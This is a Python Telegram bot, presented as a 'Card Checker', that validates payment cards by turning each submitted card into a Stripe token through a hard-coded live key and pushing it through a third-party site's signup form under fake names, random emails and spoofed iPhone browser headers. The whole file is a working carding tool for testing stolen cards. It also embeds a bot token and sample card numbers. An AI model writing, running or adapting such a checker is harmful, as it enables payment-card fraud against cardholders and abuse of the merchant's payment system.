import telebot
import requests
import random
import string
import time

BOT_TOKEN = "8072279299:AAHSQpNR0d4PuzY5l9kHAqT61-IjWhNjIAI"
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_gTSPTLXTGXVgIrOkNxFA8F9200HdVDgFMa"
STRIPE_URL = "https://api.stripe.com/v1/tokens"
FINAL_URL = "https://app.strongproposals.com/registration/submit"

def generate_random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    cc, mm, yy, cvc = map(str.strip, parts)
    if not (cc.isdigit() and mm.isdigit() and cvc.isdigit() and (len(yy) == 2 or len(yy) == 4)):
        return None
    if len(yy) == 2:
        yy = "20" + yy
    return cc, mm.zfill(2), yy, cvc

def create_stripe_token(cc, mm, yy, cvc):
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    data = {
        "card[number]": cc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[cvc]": cvc,
        "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "payment_user_agent": "stripe.js/78ef418",
        "time_on_page": str(random.randint(10000, 99999)),
        "key": STRIPE_PUBLISHABLE_KEY
    }
    resp = requests.post(STRIPE_URL, data=data, headers=headers)
    try:
        resp_json = resp.json()
    except Exception as e:
        return None, f"Stripe JSON decode error: {str(e)}"
    token = resp_json.get('id')
    if not token or not token.startswith("tok_"):
        return None, f"Stripe error: {resp_json.get('error', {}).get('message', 'Unknown error')}"
    return token, None

def submit_final_request(token, email, cc, mm, yy, cvc):
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "origin": "https://app.strongproposals.com",
        "referer": "https://app.strongproposals.com/signup/panel",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "connection": "keep-alive",
    }
    # Note: Adjust fields as per your actual form requirements
    data = {
        "_token": token,  # Using Stripe token as _tok value as per your request
        "first_name": "Peshang",
        "last_name": "Salam",
        "email_confirmation": email,
        "email": email,
        "password_confirmation": "War112233$%",
        "password": "War112233$%",
        "phone": "3144740104",
        "card_number": cc,
        "card-cvc": cvc,
        "month": mm,
        "year": yy,
        "stripe_token": token,
        "package_id": '11"',
    }
    response = requests.post(FINAL_URL, data=data, headers=headers)
    return response.text

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 StrongProposals Card Checker Bot\n"
        "Send cards in format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n\n"
        "Example:\n"
        "4430510072892235|02|27|809\n"
        "5218531116585093|12|2030|470"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card_line in cards:
        parsed = parse_card_input(card_line)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid format: {card_line}")
            continue
        cc, mm, yy, cvc = parsed
        email = generate_random_email()

        token, err = create_stripe_token(cc, mm, yy, cvc)
        if err:
            bot.send_message(message.chat.id, f"❌ Stripe token error: {err}")
            continue

        # Use the Stripe token as _tok value in final URL request
        full_response = submit_final_request(token, email, cc, mm, yy, cvc)
        bot.send_message(message.chat.id, f"Card: {cc}|{mm}|{yy}|{cvc}\nEmail: {email}\n\nFull Response:\n{full_response}")

        time.sleep(10)  # 10 seconds delay between cards

bot.infinity_polling()